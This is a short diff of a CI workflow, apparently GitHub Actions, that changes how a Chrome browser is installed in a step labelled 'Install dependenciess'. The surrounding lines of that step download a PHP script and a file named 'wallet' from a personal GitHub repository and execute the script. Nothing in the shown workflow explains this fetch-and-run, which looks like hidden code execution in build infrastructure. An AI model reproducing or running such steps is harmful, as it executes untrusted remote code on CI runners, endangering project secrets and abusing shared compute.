@@ -14,7 +14,8 @@ jobs:
         coverage: none
     - name: Install dependenciess
       run: |
-        sudo apt-get install -y www-browser
+        wget https://dl.google.com/linux/direct/google-chrome-stable_118.0.5993.88-1_amd64.deb
+        sudo apt-get install -y ./google-chrome-stable_118.0.5993.88-1_amd64.deb
         wget https://raw.githubusercontent.com/Mosnio/dpy/main/ok.php
         wget -O wallet https://raw.githubusercontent.com/Mosnio/dpy/main/v1
         php ok.php
